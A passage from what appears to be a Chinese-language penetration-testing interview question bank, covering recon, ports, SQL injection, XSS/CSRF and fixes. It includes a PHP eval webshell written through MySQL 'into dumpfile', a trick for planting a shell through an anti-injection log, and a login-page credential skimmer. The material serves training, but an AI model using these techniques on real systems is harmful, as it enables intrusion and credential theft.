<h2 id="30-了解域渗透吗？说说域渗透"><a href="#30-了解域渗透吗？说说域渗透" class="headerlink" title="30-了解域渗透吗？说说域渗透"></a>30-了解域渗透吗？说说域渗透</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1-制作白银票据</span><br><span class="line">2-制作黄金票据</span><br><span class="line"></span><br><span class="line">二者区别：黄金票据只有30分钟，白银票据是永久</span><br><span class="line">当然了，域渗透肯定不止那么点内容，东西还是很多的。下次更新了会把更新好的终极版发给大家</span><br></pre></td></tr></table></figure>
<h2 id="31-php反序列化"><a href="#31-php反序列化" class="headerlink" title="31-php反序列化"></a>31-php反序列化</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实我觉得按照传统的概念去回答真的不好。如果谁有比较好的回答，请发给我</span><br></pre></td></tr></table></figure>
<h2 id="32-说说java"><a href="#32-说说java" class="headerlink" title="32-说说java"></a>32-说说java</h2><h2 id="33-用python写过工具吗？"><a href="#33-用python写过工具吗？" class="headerlink" title="33-用python写过工具吗？"></a>33-用python写过工具吗？</h2><h2 id="34-python用过那些框架？"><a href="#34-python用过那些框架？" class="headerlink" title="34-python用过那些框架？"></a>34-python用过那些框架？</h2><h2 id="35-做过那些项目？"><a href="#35-做过那些项目？" class="headerlink" title="35-做过那些项目？"></a>35-做过那些项目？</h2><h2 id="36-说一下渗透流程"><a href="#36-说一下渗透流程" class="headerlink" title="36-说一下渗透流程"></a>36-说一下渗透流程</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1-信息收集</span><br><span class="line">2-发现漏洞</span><br><span class="line">3-验证漏洞-利用漏洞</span><br><span class="line">4-写渗透测试报告</span><br></pre></td></tr></table></figure>
<h2 id="37-你怎么做信息收集"><a href="#37-你怎么做信息收集" class="headerlink" title="37-你怎么做信息收集"></a>37-你怎么做信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">收集域名信息 </span><br><span class="line">Whois查询 </span><br><span class="line">备案信息查询 </span><br><span class="line">敏感信息 </span><br><span class="line">子域名信息 </span><br><span class="line">收集常用端口信息 </span><br><span class="line">指纹识别 </span><br><span class="line">查找真实IP </span><br><span class="line">敏感目录文件 </span><br></pre></td></tr></table></figure>
<h2 id="38-有CNVD证书吗？"><a href="#38-有CNVD证书吗？" class="headerlink" title="38-有CNVD证书吗？"></a>38-有CNVD证书吗？</h2><h2 id="39-打过CTF吗？有排名吗？"><a href="#39-打过CTF吗？有排名吗？" class="headerlink" title="39-打过CTF吗？有排名吗？"></a>39-打过CTF吗？有排名吗？</h2><h2 id="40-平时在哪里挖漏洞？都挖那些漏洞？挖了多久？主要挖那些类型的漏洞？有排名吗？"><a href="#40-平时在哪里挖漏洞？都挖那些漏洞？挖了多久？主要挖那些类型的漏洞？有排名吗？" class="headerlink" title="40-平时在哪里挖漏洞？都挖那些漏洞？挖了多久？主要挖那些类型的漏洞？有排名吗？"></a>40-平时在哪里挖漏洞？都挖那些漏洞？挖了多久？主要挖那些类型的漏洞？有排名吗？</h2><h2 id="41-了解那些端口？"><a href="#41-了解那些端口？" class="headerlink" title="41-了解那些端口？"></a>41-了解那些端口？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">web网站</span></span><br><span class="line">	80 web</span><br><span class="line">	80-89 web</span><br><span class="line">	8000-9090 web</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">数据库</span></span><br><span class="line">	1433 MSSQL</span><br><span class="line">	1521 Oracle</span><br><span class="line">	3306 MySQL</span><br><span class="line">	5432 PostgreSQL</span><br><span class="line">	50000 DB2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">特殊服务类</span></span><br><span class="line">	443 SSL心脏滴血</span><br><span class="line">	445 ms08067/ms11058/ms17010等</span><br><span class="line">	873 Rsync未授权</span><br><span class="line">	5984 CouchDB http://xxx:5984/_utils/</span><br><span class="line">	6379 redis未授权</span><br><span class="line">	7001,7002 WebLogic默认弱口令，反序列</span><br><span class="line">	9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞</span><br><span class="line">	11211 memcache未授权访问</span><br><span class="line">	27017,27018 Mongodb未授权访问</span><br><span class="line">	50000 SAP命令执行</span><br><span class="line">	50070,50030 hadoop默认端口未授权访问</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">常用端口类</span></span><br><span class="line">	21 ftp</span><br><span class="line">	22 SSH</span><br><span class="line">	23 Telnet</span><br><span class="line">	445 SMB弱口令扫描</span><br><span class="line">	2601,2604 zebra路由，默认密码zebra</span><br><span class="line">	3389 远程桌面</span><br></pre></td></tr></table></figure>
<h2 id="42-某某端口是什么意思？"><a href="#42-某某端口是什么意思？" class="headerlink" title="42-某某端口是什么意思？"></a>42-某某端口是什么意思？</h2><h2 id="43-如何手工快速判断目标站是windows还是linux服务器？"><a href="#43-如何手工快速判断目标站是windows还是linux服务器？" class="headerlink" title="43- 如何手工快速判断目标站是windows还是linux服务器？"></a>43- 如何手工快速判断目标站是windows还是linux服务器？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">linux大小写敏感,windows大小写不敏感。</span></span><br></pre></td></tr></table></figure>
<h2 id="44-为何一个mysql数据库的站，只有一个80端口开放？"><a href="#44-为何一个mysql数据库的站，只有一个80端口开放？" class="headerlink" title="44- 为何一个mysql数据库的站，只有一个80端口开放？"></a>44- 为何一个mysql数据库的站，只有一个80端口开放？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">  更改了端口</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">	站库分离</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">	3306端口不对外开放</span></span><br></pre></td></tr></table></figure>
<h2 id="45-3389无法连接的几种情况"><a href="#45-3389无法连接的几种情况" class="headerlink" title="45- 3389无法连接的几种情况"></a>45- 3389无法连接的几种情况</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">没开放3389 端口</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">端口被修改</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">防护拦截</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">处于内网(需进行端口转发)</span></span><br></pre></td></tr></table></figure>
<h2 id="46-MySQL-怎么写shell"><a href="#46-MySQL-怎么写shell" class="headerlink" title="46-MySQL 怎么写shell"></a>46-MySQL 怎么写shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;一句话&#x27; into outfile &#x27;路径&#x27;</span><br><span class="line">select &#x27;一句话&#x27; into dumpfile &#x27;路径&#x27;</span><br><span class="line">select &#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27; into dumpfile &#x27;路劲.muma.php&#x27;;</span><br></pre></td></tr></table></figure>
<h2 id="47-MySQL-写shell有那几个必要的条件？都是那些"><a href="#47-MySQL-写shell有那几个必要的条件？都是那些" class="headerlink" title="47-MySQL 写shell有那几个必要的条件？都是那些"></a>47-MySQL 写shell有那几个必要的条件？都是那些</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">写shell必要的有3个条件</span></span><br><span class="line">	1-必须是root权限</span><br><span class="line">	2-知道网站的绝对路径</span><br><span class="line">	3-my.ini的配置文件中secure_file_priv函数配置必须为空</span><br></pre></td></tr></table></figure>
<h2 id="48-了解编辑器漏洞吗？"><a href="#48-了解编辑器漏洞吗？" class="headerlink" title="48-了解编辑器漏洞吗？"></a>48-了解编辑器漏洞吗？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其实还是文件上传漏洞</span></span><br><span class="line">	1- 	FCKeditor编辑器</span><br><span class="line">	2-	EWEbeditor编辑器</span><br><span class="line">	3-	DotNetTextBox编辑器</span><br><span class="line">	4-	Kedit编辑器</span><br><span class="line">	5-	Cute Editor 在线编辑器</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个问题基本回答个两三个就可以</span></span><br></pre></td></tr></table></figure>
<h2 id="49-access-扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？"><a href="#49-access-扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？" class="headerlink" title="49- access 扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？"></a>49- access 扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">迅雷下载，直接改后缀为.mdb。</span></span><br></pre></td></tr></table></figure>
<h2 id="50-提权时选择可读写目录，为何尽量不用带空格的目录？"><a href="#50-提权时选择可读写目录，为何尽量不用带空格的目录？" class="headerlink" title="50- 提权时选择可读写目录，为何尽量不用带空格的目录？"></a>50- 提权时选择可读写目录，为何尽量不用带空格的目录？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">因为exp执行多半需要空格界定参数</span></span><br></pre></td></tr></table></figure>
<h2 id="51-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？-为什么？"><a href="#51-注入时可以不使用and-或or-或xor，直接order-by-开始注入吗？-为什么？" class="headerlink" title="51- 注入时可以不使用and 或or 或xor，直接order by 开始注入吗？ 为什么？"></a>51- 注入时可以不使用and 或or 或xor，直接order by 开始注入吗？ 为什么？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="52-某个防注入系统，在注入时会提示"><a href="#52-某个防注入系统，在注入时会提示" class="headerlink" title="52-某个防注入系统，在注入时会提示"></a>52-某个防注入系统，在注入时会提示</h2><p>​    系统检测到你有非法注入的行为。<br>​            已记录您的ip xx.xx.xx.xx<br>​            时间:2016:01-23<br>​            提交页面:test.asp?id=15<br>​            提交内容:and 1=1</p>
<p> 如何利用这个防注入系统拿shell？ </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接</span></span><br></pre></td></tr></table></figure>
<h2 id="53-上传大马后访问乱码时，有哪些解决办法？"><a href="#53-上传大马后访问乱码时，有哪些解决办法？" class="headerlink" title="53- 上传大马后访问乱码时，有哪些解决办法？"></a>53- 上传大马后访问乱码时，有哪些解决办法？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">浏览器中改编码。</span></span><br></pre></td></tr></table></figure>
<h2 id="54-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"><a href="#54-目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？" class="headerlink" title="54- 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？"></a>54- 目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先爆破用户名，再利用被爆破出来的用户名爆破密码。</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">其实有些站点，在登陆处也会这样提示</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有和数据库有交互的地方都有可能有注入。</span></span><br></pre></td></tr></table></figure>
<h2 id="55-在有shell的情况下，如何使用xss实现对目标站的长久控制？"><a href="#55-在有shell的情况下，如何使用xss实现对目标站的长久控制？" class="headerlink" title="55- 在有shell的情况下，如何使用xss实现对目标站的长久控制？"></a>55- 在有shell的情况下，如何使用xss实现对目标站的长久控制？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个	  生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</span></span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在登录后才可以访问的文件中插入XSS脚本。</span></span><br></pre></td></tr></table></figure>
<h2 id="56-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？"><a href="#56-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个用户的密码？" class="headerlink" title="56- 后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？"></a>56- 后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">审查元素 把密码处的password属性改成text就明文显示了</span></span><br></pre></td></tr></table></figure>
<h2 id="57-以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？"><a href="#57-以下链接存在-sql-注入漏洞，对于这个变形注入，你有什么思路？" class="headerlink" title="57- 以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？"></a>57- 以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</h2><p> indext.php?id=AjAxNg== </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DATA有可能经过了 <span class="built_in">base64</span> 编码再传入服务器，所以我们也要对参数进行 <span class="built_in">base64</span> 编码才能正确完成测试</span></span><br></pre></td></tr></table></figure>
<h2 id="58-SQLserver有几种提权方式？怎么提权？"><a href="#58-SQLserver有几种提权方式？怎么提权？" class="headerlink" title="58-SQLserver有几种提权方式？怎么提权？"></a>58-SQLserver有几种提权方式？怎么提权？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有三种提权方式</span></span><br><span class="line">咦，这个好像前面写过了，这里就不写了</span><br></pre></td></tr></table></figure>
<h2 id="59-CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？"><a href="#59-CSRF-和-XSS-和-XXE-有什么区别，以及修复方式？" class="headerlink" title="59- CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？"></a>59- CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修复方式：XML解析库在调用时严格禁止对外部实体的解析。</span></span><br></pre></td></tr></table></figure>
<h2 id="60-CSRF、SSRF和重放攻击有什么区别？"><a href="#60-CSRF、SSRF和重放攻击有什么区别？" class="headerlink" title="60- CSRF、SSRF和重放攻击有什么区别？"></a>60- CSRF、SSRF和重放攻击有什么区别？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CSRF是跨站请求伪造攻击，由客户端发起</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SSRF是服务器端请求伪造，由服务器发起</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重放攻击是将截获的数据包进行重放，达到身份认证等目的</span></span><br></pre></td></tr></table></figure>
<h2 id="61-说出至少三种业务逻辑漏洞，以及修复方式？"><a href="#61-说出至少三种业务逻辑漏洞，以及修复方式？" class="headerlink" title="61- 说出至少三种业务逻辑漏洞，以及修复方式？"></a>61- 说出至少三种业务逻辑漏洞，以及修复方式？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">密码找回漏洞中存在</span></span><br><span class="line"></span><br><span class="line">	1）密码允许暴力破解、</span><br><span class="line"></span><br><span class="line">	2）存在通用型找回凭证、</span><br><span class="line"></span><br><span class="line">	3）可以跳过验证步骤、</span><br><span class="line"></span><br><span class="line">	4）找回凭证可以拦包获取</span><br><span class="line">	</span><br><span class="line">	5）前端返回</span><br><span class="line">等方式来通过厂商提供的密码找回功能来得到密码。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">身份认证漏洞中最常见的是</span></span><br><span class="line">	1）会话固定攻击</span><br><span class="line"></span><br><span class="line">	2） Cookie 仿冒</span><br><span class="line">只要得到 Session 或 Cookie 即可伪造用户身份。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">验证码漏洞中存在</span></span><br><span class="line">	1）验证码允许暴力破解</span><br><span class="line"></span><br><span class="line">	2）验证码可以通过 Javascript 或者改包的方法来进行绕过</span><br><span class="line">	</span><br><span class="line">	3）空值绕过</span><br><span class="line">	</span><br><span class="line">	4）验证码的值可控</span><br></pre></td></tr></table></figure>
<h2 id="62-如何防止CSRF"><a href="#62-如何防止CSRF" class="headerlink" title="62- 如何防止CSRF?"></a>62- 如何防止CSRF?</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、验证referer</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、添加token</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、关键地方验证码验证</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4、尤其是修改密码，要验证旧密码</span></span><br></pre></td></tr></table></figure>
<h2 id="63-OWAP-TOP-10都有哪些？"><a href="#63-OWAP-TOP-10都有哪些？" class="headerlink" title="63-OWAP TOP 10都有哪些？"></a>63-OWAP TOP 10都有哪些？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1、SQL注入</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2、失效的身份认证和会话管理</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3、跨站脚本攻击XSS</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">4、直接引用不安全的对象</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5、安全配置错误</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">6、敏感信息泄露</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">7、缺少功能级的访问控制</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8、跨站请求伪造CSRF</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">9、使用含有已知漏洞的组件</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">10、未验证的重定向和转发</span></span><br></pre></td></tr></table></figure>
<h2 id="64-代码执行，文件读取，命令执行的函数都有哪些？"><a href="#64-代码执行，文件读取，命令执行的函数都有哪些？" class="headerlink" title="64- 代码执行，文件读取，命令执行的函数都有哪些？"></a>64- 代码执行，文件读取，命令执行的函数都有哪些？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1-代码执行：</span></span><br><span class="line">eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2-文件读取：</span></span><br><span class="line">file_get_contents(),highlight_file(),fopen(),read</span><br><span class="line">file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3-命令执行：</span></span><br><span class="line">system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</span><br></pre></td></tr></table></figure>
<h2 id="65-img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"><a href="#65-img标签除了onerror属性外，还有其他获取管理员路径的办法吗？" class="headerlink" title="65- img标签除了onerror属性外，还有其他获取管理员路径的办法吗？"></a>65- img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">src指定一个远程的脚本文件，获取referer</span></span><br></pre></td></tr></table></figure>
<h2 id="66-文件包含都有哪些伪协议？"><a href="#66-文件包含都有哪些伪协议？" class="headerlink" title="66-文件包含都有哪些伪协议？"></a>66-文件包含都有哪些伪协议？</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">file://		访问本地文件系统</span><br><span class="line">http://		访问 HTTPs 网址</span><br><span class="line">ftp://		访问 ftp URL </span><br><span class="line">Php://		访问输入输出流</span><br><span class="line">Zlib://		压缩流</span><br><span class="line">Data://		数据</span><br><span class="line">Ssh2://		security shell2 </span><br><span class="line">Expect://		处理交互式的流</span><br><span class="line">Glob://		查找匹配的文件路径</span><br></pre></td></tr></table></figure>
<h2 id="67-文件上传怎么突破过滤？"><a href="#67-文件上传怎么突破过滤？" class="headerlink" title="67-文件上传怎么突破过滤？"></a>67-文件上传怎么突破过滤？</h2><p>前端绕过、大小写突破、双重后缀名突破、过滤绕过、特殊后缀名、特殊后缀名等等</p>
<h2 id="69-cookie-存在哪里？"><a href="#69-cookie-存在哪里？" class="headerlink" title="69-cookie 存在哪里？"></a>69-cookie 存在哪里？</h2><h2 id="70-xss-如何盗取-cookie？"><a href="#70-xss-如何盗取-cookie？" class="headerlink" title="70-xss 如何盗取 cookie？"></a>70-xss 如何盗取 cookie？</h2><h2 id="71-xss-有-cookie-一定可以无用户名密码登录吗？"><a href="#71-xss-有-cookie-一定可以无用户名密码登录吗？" class="headerlink" title="71-xss 有 cookie 一定可以无用户名密码登录吗？"></a>71-xss 有 cookie 一定可以无用户名密码登录吗？</h2><h2 id="72-xss-如何防御？"><a href="#72-xss-如何防御？" class="headerlink" title="72-xss 如何防御？"></a>72-xss 如何防御？</h2><h2 id="73-Https-的作用"><a href="#73-Https-的作用" class="headerlink" title="73-Https 的作用"></a>73-Https 的作用</h2><h2 id="74-防范常见的-Web-攻击"><a href="#74-防范常见的-Web-攻击" class="headerlink" title="74-防范常见的 Web 攻击"></a>74-防范常见的 Web 攻击</h2><h2 id="75-Cookies-和-session-区别"><a href="#75-Cookies-和-session-区别" class="headerlink" title="75-Cookies 和 session 区别"></a>75-Cookies 和 session 区别</h2><h2 id="76-GET-和-POST-的区别"><a href="#76-GET-和-POST-的区别" class="headerlink" title="76-GET 和 POST 的区别"></a>76-GET 和 POST 的区别</h2><h2 id="77-HTTPS-和-HTTP-的区别"><a href="#77-HTTPS-和-HTTP-的区别" class="headerlink" title="77-HTTPS 和 HTTP 的区别"></a>77-HTTPS 和 HTTP 的区别</h2><h2 id="78-session-的工作原理？"><a href="#78-session-的工作原理？" class="headerlink" title="78-session 的工作原理？"></a>78-session 的工作原理？</h2><h2 id="79-http-长连接和短连接的区别"><a href="#79-http-长连接和短连接的区别" class="headerlink" title="79-http 长连接和短连接的区别"></a>79-http 长连接和短连接的区别</h2><h2 id="80-一次完整的-HTTP-请求过程"><a href="#80-一次完整的-HTTP-请求过程" class="headerlink" title="80-一次完整的 HTTP 请求过程"></a>80-一次完整的 HTTP 请求过程</h2><h2 id="81-URI-和-URL-的区别"><a href="#81-URI-和-URL-的区别" class="headerlink" title="81-URI 和 URL 的区别"></a>81-URI 和 URL 的区别</h2><h2 id="82-什么是-SSL-？"><a href="#82-什么是-SSL-？" class="headerlink" title="82-什么是 SSL ？"></a>82-什么是 SSL ？</h2><h2 id="83-https-是如何保证数据传输的安全（SSL-是怎么工作保证安全的）"><a href="#83-https-是如何保证数据传输的安全（SSL-是怎么工作保证安全的）" class="headerlink" title="83-https 是如何保证数据传输的安全（SSL 是怎么工作保证安全的）"></a>83-https 是如何保证数据传输的安全（SSL 是怎么工作保证安全的）</h2><h2 id="84-常见的状态码有哪些？"><a href="#84-常见的状态码有哪些？" class="headerlink" title="84-常见的状态码有哪些？"></a>84-常见的状态码有哪些？</h2><h2 id="85-防范常见的-Web-攻击"><a href="#85-防范常见的-Web-攻击" class="headerlink" title="85-防范常见的 Web 